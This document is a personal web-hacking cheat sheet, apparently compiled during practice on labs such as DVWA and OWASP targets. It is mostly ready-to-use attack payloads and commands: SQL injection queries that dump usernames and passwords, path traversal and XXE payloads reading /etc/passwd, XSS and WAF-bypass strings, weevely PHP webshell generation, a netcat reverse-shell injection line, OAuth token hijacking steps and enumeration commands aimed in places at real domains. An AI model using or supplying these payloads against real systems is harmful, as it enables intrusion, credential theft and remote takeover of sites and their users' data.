use exploit/multi/handler
[listen to port connection...set LHOST and LPORT]

https://hackersonlineclub.com/command-injection-cheatsheet/
[Command Injection Cheat]

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
[XSS Cheat]

https://portswigger.net/web-security/sql-injection/cheat-sheet
[SQL cheat sheet]

knockpy -u (url) --no-local -o (.txt) --no-http-code 500 404 306
[quick subdomain enum]

dirsearch -u (url) -o (.txt)
[directory busting]
///.html //.xml //.backdoor

gobuster dir --url http://10.129.53.230 --wordlist directory-list-2.3-small.txt
[directory bruteforce]

subfinder -d (target_site)
[sub domain enumeration]

sublist3r -d (sitename.com)
[search for sub domain]

ffuf -w /root/Downloads/subdomains-wordlist.txt -u https://www.yahoo.com/FUZZ
[bruteforcing extensions on a site]

cd /opt/pycharm..../bin
[open pycharm] 

ffuf -w /root/Downloads/subdomains-wordlist.txt -u https://www.yahoo.com/FUZZ -fl (line/ number0
[filter out extensions with one line or entery]

dirb https://www.yahoo.com
[testing target url with auto wordlists]

python3 -m http.server (port)
[run listening server on kali]

127.0.0.1:8080
[burpsuite config]

robot.txt
[on web domain for apache server]

../
[web dir]

tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz 
[unpack OWASP]


UNION SELECT NULL,NULL,NULL--
[SQL COLUMN]

'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=
[SQL column with password]

'UNION+SELECT+username_lsuazz,+password_pmcoxt+FROM+users_plxjnw--
[get users ppaswword and admin login query]

APP_USERS_AND_ROLES

'UNION+SELECT+table_name,NULL+FROM+all_tables---- 

||pg_sleep(10)--
[10s delay in response]

../etc/passwd
[root triversal]

..%252fetc/passwd
[RT]

sudo dotdotpwn -m http -h localhost:8080/#/login
[auto run file triversal using dotdotpwn]

sudo openvpn nmap -sV {target IP}

<!DOCTYPE foo [

<!ENTITY xxe SYSTEM "file:////etc/passwd" >]> {add (&xxe;) to product id column to call XML Injection}
<!ENTITY xxe SYSTEM "fiphp://filter/convert.base64-encode/resource=/var/www/html/db.php" >]>
[pull up database request] 

<script>alert(1)</script>
"><svg onload=alert(1)/>
[both requires "" and ''] [onerror is for img or anything with src/ onclick is for button]

</whatever tag><whatever tag>alert(1)</whatever tag>
[backlash and closing tag escape]

#File upload vulnerability 
[+] weevely generate (any_passwd) /storage_path/file_name.php
[generate php shell]

[+]weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
[listen for backdoor connection]

200
[OK]

300
[redirect/success]

400
[Bad Request]

#BLANK PAGE 
[+] intercept response and check for token in header
- pass token into dir enumeration to show more directories 

#OPEN REDIRECT
[+] Add “domain_name=any_url" at the end of redirecting URL
[+] if url redirects to a login page use “checkout_url=.attacker.com" at the end of main URL

#BYPASS A 404
[+]Enumerate with "gobuster dir -u (URL) -u (wordlist_path) -x (.exentension eg .php)
- load url with target extension and "Do intercept" then forward
- when you hit a redirect back to login page, change the "302 Found" to "200 ok" 
- 

#DIR ENUMERATION/INFORMATION DISCLOSURE 
[+] look for robots.txt files and open -- Information disclosure
[+] ./feroxbuster -u (web_URL) -w (wordlist)
- locate url with "cgi-/bin" then load to check for secret key in PHP file
- locate "/.git" directory 
- "wget -r (url)" to get folders in git then analyse the git file using "view master's history" option on git software

#FILE INCLUSION
[+] use ";nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port (nc --vv -l -n -p 8080)
[+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
[+] RFI by listening with "nc -vv -l -n -p 8080" and paste URL of reverse php(txt) payload saved on apache web server into (?page=localhost_site?)

#SQL
[+] 123456' and 1=1# -- Executing SQL command with login pass/ setting condition to TRUE	
[+} passs' or 1=1# -- Conditioning database with TRUE SQL statement and wrong pass
[+] admin' # ---- code execution for username side to exclude correct pass
[+] inject SQL in url tab if there is no login form to discover if server takes SQL
[+] "'; or 1=1#" --encode in URL
[+] ' order by 1%23 -- order result
[+] {' union select 1,2,3,4,5%23}/{' union select 1,database(),user(),version(),5%23} -- to specify SQL data
- union select 1,database(),user(),version(),5%23 ---dispaly other table set
- union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'%23 -- specify databse info to display
- union select 1,table_name,null,null,5 from information_schema.columns where table_name = 'accounts'%23 -- selected tables
- union select 1,username,password,is_admin,5 from accounts%23 ---extract sensitive information
- union select null,load_file('/etc/passwd'),null,null,null%23 ---get /etc/passwd files
- union select null,'example example',null,null,null into outfile '/tmp/example.txt'%23 --write to server
[+] test if user input on URL can reflect on page
[+] {'+and+1=1--} --test TRUE in URL
[+] {'+and+1=0--} --test FASLE in URL
[+] {'Order+by+1--}/ test for FALSE(large orderby number) too --test table order SQLi in URL
[+] {'+union+select+NULL,NULL--} --slect from table in URL
- {'+union+select+'a',NULL--} --string tabel search in URL
- {'+union+select+version(),NULL--} --POSTGRE db version check in URL
- {'+union+select+table_name,NULL+from+information_schema.tables--} -- PSTGRE table_names
- {'+union+select+column_name,NULL+from+information_schema.columns+where+table_name='users'--} --PSTGRE users column
- {'+union+select+username,NULL+from+users--} -- select username table
- {'+union+select+password,NULL+from+users--} -- select password 
- {'+union+select+username,password+from+users+where+username='administrator'--} --select password belonging to a specific user

**BLIND SQLi**
[+] test request cookies tracking ID with a FALSE statement and note changes


[+] test login with {'} if internal error shows then it allows SQLi
[+] {' or 1=1--} -- bypass login page pass
[+] Dsicover SQL vul by running {sqlmap -u "url"}
- sqlmap -u "url" --dbs    --to get current database
- sqlmap -u "url" --current-user  --check user
- sqlmap -u "url" --current-db  --check database
- sqlmap -u "url" --tables -D (db_name)  --check db tables
- sqlmap -u "url" --columns -T (desired_column) -D (db_name)  --open column
- sqlmap -u "url" -T accounts -D owasp10 --dump   ---open all database file
[+] test url endpoints

#BAC
[+] Change admin GET request to true and foward for cookies manipulation/ change admin value to true on match & replace -- Broken Access Control
- Copy a user ID to view another users sensitive information/ create 2 accounts
- Test user ID section with "administrator/admin" and view value parameter for hashed password --IDOR leading to BAC
- Test the live chat section by forwarding VIEW TRANSCIPT txt requests on Burp till theres a get request, change the txt number and see if you can download another user's chat history
[+] Intercept email update on user profile
-forward to repeater, get a RESPONSE to view "role ID"
-add "," and enter new line in REQUEST then paste "role ID = " 
-change the ID to number that gives admin privilege --to test if user role can be changed in user profile
[+] Test URL by entering "/admin" 
- intercerpt and reload "/admin" error messages
- if there"s no param to show you're not admin foward packets again to checek useful info
- if there's no useful info intercerpt and reload "/admin" error messages again and change GET to TRACE, admin file should be downloaded
- turn off interceptor and replace the IP in the file to a default localhost IP 127.0.0.1 
- copy XSS row containing IP to macth and replace section in burp proxy and reload page--auth bypass via information disclosure 

-PATH/DIR TRIVERSAL
[+] Test if you can load images/pages by manipulating endpoint with "=" sign 
- change enpoint request to "/etc/passwd" 
[+] use "../etc/passwd" as much as possible till file loads if vuln
[+] if "../etc" is being filtered try a null byte "../../../etc/passwd%00.jpg"
[+] if "../" is stripped try doubling your forward characters by "....//....//....//etc/passwd"
[+] for file path traversal try going back to root dir and gaing passwd by entering "../../../etc/passwd" infront of "/var/www/whatever" 
[+] if "/" is filtered out in "../etc" use url encode "..%2fect"
- if it doesn't work, double the url encode all character on "/"
[+] send request to intruder, clear $ sign, add your end point to $ sign
- paste payload in intuder payload and auto start traversal attack --to automate dir/Path traversal
[+] 

#CSRF
[+] Copy the element of a user section(email upadte frame) and paste in file 
- add the url path from the main site to the action form
- load up file on web browser, try update email/password from there
- check back on main site if request  was forged 
[+] clear token value in element "value" section if its doesn't work 

#OAuth
[+] create 2 accounts, monitor the HTTP history containing the "/authenticate"
- change the login details on the column that has an OAuth Token
- click on request in broswer, original session, then copy modified url --reuse an access token
[+] Login to your account and link socials
- obtain OAuth code and drop packets to aviod the code from expiring 
- log out of the account and deliver Oauth URL in "iframe" as exploit, you should have access to admin
[+] logout and login to account to see if the Oauth cookies work
- copy the callback && redirect OAuth url in burp history and paste into an html iframe, deliver to target
- check site access logs for admin Oauth code 
- copy url containing OAuth code and replace the code with the new admin code
- paste url in browser you should be logged in as admin

#OS INJECTION
[+] ";uname"/";pwd" right inline/front of a parameter or endpoint 
[+] Check Submit Feedback and test email with ";sleep+5;"
- or use "||sleep+5||"

#XSS
[+] <Img Src=OnXSS OnError=confirm(1)> -- WAF Bypass payload 
[+] Test site with html injection tags e.g <b>test<b> beforre inputting XSS
[+] Scope: test COMMENTS, FEEDBACKS, CHECK STOCK & SEARCH 
[+] Check the string or parameter you are entrapped by inspecting webpage
[+] Use "=javascript:alert(1)" within URL if trapped in HREF argument or URL PATH
- if trapped in an src tag, close the src tag and inject XSS e.g {"><script>alert(6)</script>}
- or {"onload=alert(2)} into search bar
[+] Use {';alert(5);//} in comment/serach section  --break out of a JS code
[+] Manipulate store ID and check where you got trapped 
- paste XSS in url when trapped in the ID or SELECT tag
[+] Use Wappalyzer to cehck site Library
[+] Bypaas back tick "${alert(2)}"
[+] Escape backward slash with {\';alert(5);//}
[+] Escape href tag parameter ');, add {alert(8);//');} behinde website url in WEBSITE adding field
- if the WA adds a backward slash to counter, add a backward slash to the url e.g "https://google.com\');alert(8);//"
- if program filter single quote change to encoding e.g "https://google.com&apos;);alert(8);//" --stored XSS into oneclick event 
[+] if all HTML tags are blocked use a non-working tag to test the search then input "<bkk onfocus=alert(8) tabindex=1>blog<\bkk>" to treat the tag as an element
- if attribute is not allowed, forward the test search to intuder, clear the word tested in the POSITION and add "<$$>"
- copy and paste all possible html tag into PAYLOAD section and start attack
- use/test the tag with a 200 ok
- add the working tag to the POSITION with url encoding of SPACE e.g "serach=<body%20$$>", paste possible JS events into PAYLOADS and start atatck
- use JS event that work with accepted HTML tag
[+] Intercept XSS request and FORWARD it till you get a POST request 
- add "&token=sss" in URL to see where it is being injected in site 
- mark option to intercept response in proxy 
- add {;script-src-elem 'unsafe-inline'} to URL containing XSS and paste in browser --CSP token


*******************************
****INFORMATION GATHERING******

whoislookup
[site to check url IP]

netcraft
[site to view url devices]

robtex.com
[site to analyse DNS record]

git clone https://github.com/guelfoweb/knock.git
[subdomain enumeration]

subfinder -d (target_site)
[sub domain enumeration]

xss vibes
[automate xss]

amass
[enum]

httpx
[probe]

dirb
[dir enum]

gobuster
[enum]

knockpy
[enum/probe]

dirsearch
[dir enum]

theHarvest -d (url) -l 500 -b (where to check)
[harvest site email]

[+] look for robot.txt files and open 


